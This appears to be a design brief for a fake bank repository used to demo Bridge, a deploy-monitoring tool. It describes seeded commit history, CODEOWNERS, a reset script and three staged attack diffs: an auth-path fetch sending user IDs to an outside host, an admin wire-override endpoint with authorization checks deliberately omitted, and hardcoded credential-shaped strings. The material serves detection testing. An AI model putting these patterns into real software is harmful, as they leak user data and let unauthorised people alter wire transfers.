# Demo Target Repo — Brainstorming Brief

This brief is for a fresh session focused only on the **demo target repo** that Bridge watches. The full Bridge spec is at `docs/superpowers/specs/2026-05-01-bridge-design.md`; everything below is the *just-the-demo-repo* slice you'd want to riff on without loading the whole spec into context.

---

## What it is

A fictional major-bank repo named **`meridian/core-banking`** that lives next to the Bridge repo. Bridge monitors it via GitHub webhook. We control the contents 100% — author identities, file structure, commit history, branches.

It exists for one reason: to **make Bridge's war room go red in front of judges, on a deploy that has *real* signals to detect**.

Local clone path: `../meridian-core-banking/`

## Product framing

**Meridian Bank — Core Banking Platform.** Reads as a major bank's wires + AML + identity codebase. Why a bank: an exfil endpoint inside `lib/billing/stripe.ts` of a generic SaaS reads as "compliance ticket"; an exfil endpoint inside `lib/auth.ts` of a wires API reads as "the bank just got robbed". Same code, 10× perceived stakes.

The README of the demo repo says: *"Meridian Bank — Core Banking Platform. Wires, ACH, cards, identity, compliance. Internal infrastructure repo."* Plausible enough to feel real.

## File structure

```
meridian-core-banking/
├── app/
│   ├── (app)/dashboard/page.tsx          ← internal ops dashboard
│   └── api/
│       ├── admin/wire-override/route.ts  ← TARGET of scenario B (privilege escalation)
│       ├── auth/[...nextauth]/route.ts
│       ├── wires/initiate/route.ts       ← real wire-transfer endpoint
│       └── wires/approve/route.ts        ← dual-control approval
├── components/ui/{Button,Card}.tsx       ← dev-3's home turf
├── lib/
│   ├── auth.ts                           ← TARGET of scenario A (auth-exfil — LIVE demo)
│   ├── auth/{session,permissions}.ts
│   ├── billing/stripe.ts                 ← cards / recurring
│   ├── compliance/aml.ts                 ← AML / sanctions
│   ├── db/queries.ts
│   ├── observability/emit.ts             ← TARGET of scenario C (hardcoded AKIA leak)
│   └── wires/{transfer,validate}.ts
├── .github/CODEOWNERS                    ← scenario findings cross-reference this
├── package.json (Next 15, React 18)
└── README.md
```

**Files are minimal but real** — not empty stubs. Each has plausible TypeScript so signal regexes have something to match. `lib/auth.ts` ships with a *legitimate* internal `fetch('https://identity.meridian.internal/...')` call already in it, so the demo's exfil fetch reads as "an extra one was added" rather than "this is the only fetch in the file".

## Authors (seeded into git history)

9 contributors. Map of who has touched what:

| login | display name | tenure | role | home area |
|---|---|---|---|---|
| `ana-w` | Ana Whitfield | 4y | Sr. Eng, Reliability | `lib/queue/` |
| `k-chen` | Kuan Chen | 3y | Staff Eng, Data | `lib/db/` |
| `d-park` | Daria Park | 2y | Eng, Payments | `lib/billing/` |
| `m-rivera` | Mateo Rivera | 5y | Principal, Observability | `lib/observability/` |
| `j-singh` | Jaspreet Singh | 6y | Eng Mgr, Admin Tools | `app/api/admin/` |
| `t-okafor` | Tomi Okafor | 7y | Tech Lead, Identity | `lib/auth/` |
| `s-lin` | Sarah Lin | 1y | Eng, Frontend | `components/ui/` |
| `r-gomez` | Rosa Gomez | 8mo | Eng, Internal Tools | `app/(app)/` |
| **`dev-3`** | **Devin Ross** | **14d** | **Eng (new hire)** | `components/ui/` ONLY |

**`dev-3` is the demo committer for all 3 scenarios.** The History Inspector finding "this author has zero prior commits to lib/auth/" is *true*, not theatrical — that's the whole point.

## CODEOWNERS

`.github/CODEOWNERS` in the demo repo:

```
lib/auth/*           @t-okafor
lib/wires/*          @t-okafor @ana-w
app/api/admin/*      @j-singh
lib/observability/*  @m-rivera
lib/billing/*        @d-park
```

Investigators (specifically the History Inspector) cross-reference this. "dev-3 not in CODEOWNERS for the path they touched" is the second-cleanest visible signal.

## The 3 scenarios

Each is staged on its own branch in `meridian/core-banking`. None pushed to `main` until the demo button is clicked. Each fires a *different* signal+investigator combination so the demo proves Bridge is general-purpose, not a one-trick.

### Scenario A — Auth-exfil (LIVE demo)

- **Branch:** `demo/exfil`
- **Author:** `dev-3`
- **File:** `lib/auth.ts` (modify, ~4 lines added)
- **Diff:** add inside an existing function:
  ```ts
  await fetch('https://stats-collector.io/track', {
    method: 'POST',
    body: JSON.stringify({ user: session.userId, route: req.nextUrl.pathname }),
  });
  ```
- **Commit msg:** `chore: add auth metrics emitter`
- **Headline signals:** `external_fetch` (non-allowlisted host) + `auth_path` + `off_hours` (rehearsals at 3:42 UTC)
- **Loudest investigator:** DIFF ("exfil URL detected at lib/auth.ts:247")
- **Compound triple fired:** AUTH_EXFIL_OFFHOURS
- **Verdict:** CRITICAL

### Scenario B — Privilege escalation (pre-canned)

- **Branch:** `demo/privesc`
- **Author:** `dev-3`
- **Files:** new `app/api/admin/wire-override/route.ts` + modify `lib/auth/permissions.ts`
- **Diff:**
  - New file at `app/api/admin/wire-override/route.ts` with a POST that updates wire amounts WITHOUT calling `requireRole('admin')` or `requireDualControl()`:
    ```ts
    export async function POST(req: Request) {
      const { wireId, newAmount } = await req.json();
      // BUG/BACKDOOR: no requireRole / requireDualControl call
      await db.wires.update({ where: { id: wireId }, data: { amount: newAmount } });
      return Response.json({ ok: true });
    }
    ```
  - In `lib/auth/permissions.ts`, comment out a `requireRole('admin')` call.
- **Commit msg:** `chore: add ops override endpoint for ticket OPS-2381`
- **Headline signals:** `new_endpoint` + `critical_path` + `auth_bypass`-shape
- **Loudest investigators:** DIFF ("auth bypass shape") + HISTORY ("dev-3 has no admin history")
- **Compound triple fired:** CRITICAL_NOVEL
- **Verdict:** CRITICAL

### Scenario C — Hardcoded credential leak (pre-canned)

- **Branch:** `demo/leak`
- **Author:** `dev-3`
- **File:** `lib/observability/emit.ts` (modify)
- **Diff:**
  ```ts
  const TELEMETRY_AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';
  const TELEMETRY_JWT = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZWxlbWV0cnktc3ZjIn0.kfk8sdf9k3lj4kf9sdkl';
  // (used in a new outbound call to s3 upload)
  ```
- **Commit msg:** `chore: hardcode telemetry creds for now (revisit)`
- **Headline signal:** `secret_shapes` (matches both AKIA + JWT regexes, 2 evidence items)
- **Loudest investigator:** DIFF (AKIA pattern detected)
- **Compound triple:** none — the score still hits CRITICAL because secrets-on-critical-path is a hard signal
- **Verdict:** CRITICAL (data-loss surface)

## History seeding (T6.1 in the main spec)

Before the demo branches exist, the demo repo has 30 days of plausible history:

- ~80 commits over the last 30 days (at the rate of 2–3 a day, off-hours rare)
- Each author commits ONLY in their home area (`dev-3` only in `components/ui/`)
- Score distribution: P50 < 0.2, occasional spikes to 0.4 (false positives are realistic)
- Each commit's diff runs through Bridge's signal pipeline at seed time → KV records `deploys:{sha}` with `seeded: true` and full `history:author:*` / `history:hour:*` / `history:cochange:*` records

**Watermark sha** is captured into `.demo-watermark` (in the Bridge repo) at end of seed. Reset script (T6.3.1) uses this as the boundary — anything after the watermark gets wiped on reset; seeded history is preserved.

## Recreatable demo (T6.3 in the main spec)

`scripts/reset-demo.sh` does:

1. **KV reset.** Delete `deploys:`, `verdicts:`, `threats:`, `investigator:` keys whose `pushed_at > watermark.pushed_at`. Restore `history:*` records to pre-demo snapshot.
2. **Demo-target git reset.** In `meridian/core-banking`, `git reset --hard $WATERMARK_SHA` on `main`, force-push. **The 3 demo branches are LEFT INTACT** — they're the source of demo commits.
3. **Slack reset.** Post `// demo reset · ready ·` to the bot channel.
4. Touch `.last-reset-at` sentinel.

Idempotent — running it twice in a row is safe.

The "RUN DEMO" buttons (T8.1.1) do the inverse: `gh api repos/meridian/core-banking/merges` to merge the chosen scenario branch into `main`, which fires the webhook → war room lights up.

## Open questions for the brainstorm

These are the things I'd want a fresh session to push on:

1. **Is `meridian/core-banking` the right name?** Alternatives considered: `summit-financial/core-payments`, `keystone-bank/wires-api`, `apex-trust/core-banking`. Pick one that evokes "major bank" without infringing.
2. **Should `lib/auth.ts` already have an existing internal `fetch()`?** Yes was the call (so the exfil reads as "extra fetch added", not "the only one"), but worth pressure-testing — does this make the diff harder for judges to spot, or easier ("look, there's TWO fetches now")?
3. **Should we have a CHANGELOG / commit-style guide in the demo repo** that the seeded commits follow? Adds realism. Cost: ~30 min of authoring.
4. **dev-3's persona — new hire (current call) vs external contractor vs compromised account.** New hire is most relatable; contractor adds "external risk" angle; compromised account is dramatic but invites "how did you detect without their session token?" pushback.
5. **Should the 3 scenarios share authorship (all dev-3) or vary?** Currently all dev-3 — keeps the "novel author" signal consistent. Alternative: scenarios B and C use *different* novel-area authors so the demo proves the system catches *anyone* novel, not just dev-3.
6. **Do we want a 4th scenario** for true Q&A safety net? Candidates: SSRF, eval/exec injection, error-swallowing patch that hides a real bug, denial-of-service via unbounded loop.
7. **Does the demo repo need to actually BUILD?** (i.e., `npx tsc --noEmit` in `meridian-core-banking/` exits 0) Currently yes (T0.4.1's tier4 requires it). Is that overkill, or essential to "this is real"? If we drop it, signals still fire (regex on diffs), but the repo reads as a stub.
8. **Should `meridian-core-banking` be a public repo or private?** Public reads as more "real" but anyone can clone. Private is safer but requires a GitHub PAT scope on the Bridge side. Currently spec leaves this open.
9. **What's the README of `meridian-core-banking` say?** Currently "Meridian Bank — Core Banking Platform." Could expand to include a fake architecture diagram, "deploys to production via GitHub Actions", etc. — adds realism, costs ~20min.
10. **Reset cadence for live demo day** — after every rehearsal, or only between distinct judge groups? Need an ops plan.

## Pointers into the main spec

If a question requires the full Bridge context, reference these sections:

| Topic | Spec section |
|---|---|
| Repo structure / file list | T0.4.1 |
| 30-day history seed | T6.1.1 – T6.1.3 |
| Scenario A (exfil) | T6.2.2 |
| Scenario B (privesc) | T6.2.3 |
| Scenario C (leak) | T6.2.4 |
| Cross-scenario sanity | T6.2.5 |
| Reset script | T6.3.1 |
| RUN DEMO buttons | T8.1.1 |
| 3 rehearsals + chaos drill | T8.1.8 |
